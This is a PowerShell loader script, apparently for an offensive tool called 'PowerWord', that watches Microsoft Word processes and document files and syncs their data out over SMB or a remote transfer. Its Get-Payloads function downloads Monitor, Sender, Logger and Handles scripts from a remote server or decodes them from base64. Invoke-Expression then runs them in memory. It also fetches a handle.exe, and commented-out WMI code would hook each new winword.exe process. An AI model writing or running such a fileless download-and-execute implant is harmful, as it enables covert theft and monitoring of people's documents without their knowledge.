param (
    $global:LogLocation = "stdout", # Remote/Local/stdout
    $global:LogPath = "127.0.0.1:5000/log/", # Only if Remote or Local is enabled

    $global:LiveMode = $true, # Live / Handle Close
    $global:LiveModeInterval = 5, # Every x seconds to sync data, only in live mode
    $global:WordFileExtentions =@('docx','txt'),

    $global:CommunicationMethod = "smb", # smb / remote transfer
    $global:Remote = 'c:\temp\', # Only when using remote transfer

    $global:HandelsMethod = "code", # handels / openfiles / code
    $global:HandlesExeMethod = "remote", # To download on scripts load or to use base64 local
    $global:HandlesExePath = "D:\git\PowerWord\handle123.exe", # Path to save and use handles exe from.
    $global:HandlesExeRemoteLocation = "http://127.0.0.1:8000/",

    $global:LoadFromRemote = "yes", # To download and run from memory, or use builtin payload
    $global:RemoteLoadPath = "http://127.0.0.1:8000/", # From where to download the Payload

    $global:HandlePaylod = "default",
    $global:MonitorPayload = "default",
    $global:SenderPayload = "default",
    $global:LoggerPayload = "default",
    $global:HandlePsPayload = "default",
    $global:HandlesMonitor = "default"
)


function Get-Payloads{
    $FullScript = ""
    switch ($LoadFromRemote) {
        No {
            try {
                $global:MonitorPayload = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($MonitorPayload))
                $global:SenderPayload = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($SenderPayload))
                $global:LoggerPayload = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($LoggerPayload))
                $global:HandlePsPayload = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($HandlePsPayload))
            }
            catch {
                Write-Host "Wrong base64 format, check payloads"
                Exit
            }
            Write-Host "Done Getting Scripts"
          }
        Yes {
            if ($RemoteLoadPath -ne "default"){
                $webclient = new-object System.Net.WebClient
                try {
                    $global:MonitorPayload = $webclient.DownloadString($RemoteLoadPath + "Monitor.ps1")
                    $global:SenderPayload = $webclient.DownloadString($RemoteLoadPath + "Sender.ps1")
                    $global:LoggerPayload = $webclient.DownloadString($RemoteLoadPath + "Logger.ps1")
                    $global:HandlePsPayload = $webclient.DownloadString($RemoteLoadPath + "Handles.ps1")
                }
                catch {
                    Write-Host "Error contacting Remote Host"
                    Exit
                }
                Write-Host "Done Getting Scripts"

            }
            else {
                Write-Host "no RemoteLoadPath Flag given"
                Exit
            }
         }
        Default {
            Write-Host "Error deciding from where to read file, check flag -LoadFromRemote"
            Exit
        }
    }
    return $FullScript
}


function lolololol{
    Get-Payloads
    Invoke-Expression $HandlePsPayload
    Invoke-Expression $LoggerPayload
    if(!(Get-Handels-Method)){exit}
    $global:Payload = $MonitorPayload + $SenderPayload + $LoggerPayload + $HandlePsPayload
    if ($HandelsMethod -eq "code"){ $global:Payload += $HandlesMonitor}
    Invoke-Expression $Payload
    Start-Mon -ProcID 5180

    #$Query = "Select * From __InstanceCreationEvent within 5 Where TargetInstance ISA 'Win32_Process'"
    #$Identifier = "StartProcess"
    #$ActionBlock = {
    #    $e = $event.SourceEventArgs.NewEvent.TargetInstance
    #    if ($e.Name -eq "winword.exe"){
    #        Invoke-Expression $Payload
    #        Start-Mon -ProcID $e.ProcessID
    #    }
    #}
#
    #Register-WMIEvent -Query $Query -SourceIdentifier $Identifier -Action $ActionBlock 
}

lolololol